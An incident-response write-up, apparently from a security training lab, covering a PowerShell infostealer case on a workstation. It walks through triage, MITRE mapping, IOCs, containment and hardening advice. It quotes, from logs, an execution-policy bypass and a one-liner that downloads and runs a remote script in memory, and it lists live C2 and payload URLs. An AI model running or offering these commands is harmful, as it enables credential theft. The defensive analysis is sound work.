
# SOC153 - Suspicious Powershell Script Executed — Case #238

## Alert Overview
- **Severity:** High
- **Detection Source:** SIEM / Network IDS
- **Asset Affected:** Tony-Workstation (172.16.17.206)
- **Threat Type:** InfoStealer / Living off the Land (LotL) / Fileless Malware
- **Status:** True Positive (Compromised)

## Strategy and Technical Context
This attack demonstrates a multi-stage payload delivery utilizing "Living off the Land" (LotL) techniques. The threat actor leverages PowerShell—a native, trusted Windows administrative tool—to bypass traditional antivirus solutions. 

The strategy involves two distinct phases:
1. **Execution Policy Bypass:** The initial script drops to disk but uses a specific command-line argument to temporarily disable PowerShell security restrictions (`Set-ExecutionPolicy -Scope Process Bypass`), allowing unsigned code to run.
2. **Fileless Execution (Stager):** The initial script acts as a stager. It reaches out to an external server, downloads a secondary script, and uses `Invoke-Expression (IEX)` to execute the malicious code directly in the computer's RAM. Because the second script never touches the hard drive, static endpoint antivirus scanners are effectively blinded.

## Brief about the Concept
The malware in this incident functions as an **InfoStealer**. InfoStealers are designed to rapidly enumerate an infected host, targeting sensitive data such as cryptocurrency wallet config files (Electrum, Exodus), FTP credentials (WinSCP, FileZilla), and browser data (cookies, saved passwords). Once gathered, the data is packaged and sent to an external Command and Control (C2) server.

## Investigation Steps

### 1. Alert Triage and Initial Payload Analysis
The investigation began with an alert for a suspicious script: `payload_1.ps1`.
- **Location:** `C:\Users\LetsDefend\Downloads\payload_1.ps1`
- **Hash:** `db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0`
- **OSINT Verification:** VirusTotal flagged the hash as a known PowerShell Trojan/InfoStealer.
- **Delivery Vector:** EDR Browser History and Network logs confirmed the file was downloaded via an AWS S3 bucket: `https://files-ld.s3.us-east-2.amazonaws[.]com/payload_1.ps1`.

### 2. Execution Verification (Log Correlation)
To determine if the script successfully ran, log management was queried. A critical command-line execution was identified:
`"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-Command" "if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\LetsDefend\Downloads\payload_1.ps1\payload_1.ps1'"`
- **Analysis:** The attacker actively checked the system's execution policy and temporarily bypassed it to force the execution of the downloaded script.

### 3. Fileless Second Stage Analysis
Network logs revealed a secondary, heavily obfuscated command executed by `cmd.exe`:
`"C:\Windows\system32\cmd.exe" /c "powershell -command IEX(IWR -UseBasicParsing 'https://kionagranada.com/upload/sd2.ps1')"`
- **Analysis:** `IWR` (Invoke-WebRequest) downloads the file `sd2.ps1`. `IEX` (Invoke-Expression) forces that file to execute immediately in memory without saving it to disk. 

### 4. Command and Control (C2) Validation
Following the memory execution, outbound network traffic logs showed a successful connection to a C2 server:
- **URL:** `HTTP://91.236.116.163/INDEX.PHP?ID=90059C37-1320-41A4-B58D-2B75A9850D2F&SUBID=9G6CLLE6`
- **Analysis:** The `ID=` and `SUBID=` parameters are classic indicators of an InfoStealer "checking in" with its C2 server, registering the newly infected victim machine and likely exfiltrating the stolen credentials.

## Analysis and Findings
The incident is a confirmed **True Positive**. The user (Tony) downloaded and executed a malicious PowerShell script. The malware successfully bypassed local execution policies, downloaded a fileless secondary payload (`sd2.ps1`), and established a connection to an external C2 server (`91.236.116.163`). Because InfoStealers execute rapidly, it is highly likely that browser credentials and wallet data were successfully exfiltrated prior to containment.

## MITRE ATT&CK Mapping
| Tactic | Technique ID | Technique Name |
| :--- | :--- | :--- |
| **Execution** | T1059.001 | Command and Scripting Interpreter: PowerShell |
| **Defense Evasion** | T1562.001 | Impair Defenses: Disable or Modify Tools (Execution Policy Bypass) |
| **Defense Evasion** | T1027 | Obfuscated Files or Information (Fileless Memory Execution) |
| **Command and Control** | T1105 | Ingress Tool Transfer |


## Indicators of Compromise (IOCs)
| Type | Value | Context |
| :--- | :--- | :--- |
| Hash (SHA256) | `db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0` | Initial PowerShell Payload (`payload_1.ps1`) |
| URL | `https://kionagranada.com/upload/sd2.ps1` | Second-stage fileless payload URL |
| IP Address | 161.22.46.148 | IP hosting the `sd2.ps1` script |
| URL/IP | `http://91.236.116.163/INDEX.PHP?ID=...` | InfoStealer Command & Control Server |
| URL | https://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1 | Initial Access through AWS |

## Blind Spots
- **Exfiltrated Data Contents:** The connection to the C2 server occurred over HTTP, but without a full packet capture (PCAP) of the session, the exact data stolen (e.g., which specific passwords or cookies were taken) cannot be precisely quantified.

## Mistakes and Lessons Learned
- **Analyst Reflection:** During the initial phase of the investigation, I spent significant time analyzing the EDR terminal and process history for `payload_1.ps1`. While I saw the browser history download, the EDR was largely silent regarding the execution of the actual commands, which caused confusion. I eventually found the execution strings in the SIEM Network/Command logs.
- **The Lesson (EDR vs. Fileless Malware):** This incident highlights a critical limitation of EDR platforms when facing "Fileless" execution. Because the malware used `Invoke-Expression (IEX)` to run the second stage entirely in memory, the EDR didn't register a new process creation (Event ID 4688). An analyst must seamlessly pivot from Endpoint Logs to SIEM/Network Logs to catch the raw PowerShell Command Block logging (Event ID 4104) and the outbound HTTP requests that reveal the true scope of an in-memory attack.

## Response and Closure
- **Action Taken:** The host (`172.16.17.206`) was manually **Isolated/Contained** to sever the connection with the C2 server. All malicious IPs and URLs were added to the perimeter blocklist. 
- **Containment Required:** Yes.
- **Closure Reason:** True Positive. Host compromised via multi-stage PowerShell InfoStealer.

## Recommendations
1. **Constrained Language Mode (CLM):** Enforce PowerShell Constrained Language Mode for all non-administrative users. This prevents the execution of advanced .NET commands and severely limits the capability of scripts using `Invoke-Expression`.
2. **Credential Reset Protocol:** Because the malware was an InfoStealer, the user "Tony" must reset all corporate passwords. Furthermore, any personal credentials (banking, crypto, personal email) saved in the browser on that workstation should be considered compromised.
3. **Attack Surface Reduction (ASR):** Implement Microsoft Defender ASR rules to block the execution of potentially obfuscated scripts and block untrusted/unsigned executables from running from USB or Webmail directories.

## Evidence / Screenshots
- **Execution Policy Bypass Log**  
![Insert Screenshot: First Log showing the execution policy bypass]
- **Fileless Execution & Stager Download**  
![Insert Screenshot: Log showing the IEX(IWR UseBasicParsing) command to kionagranada.com]
- **InfoStealer C2 Beacon**  
![Insert Screenshot: Log showing the GET request to the C2 server at 91.236.116.163]

## Skills & Tools Used
SIEM Log Correlation, EDR Telemetry Triage, PowerShell Malware Analysis, Fileless Execution Analysis, Threat Intelligence (VirusTotal), Host Containment.
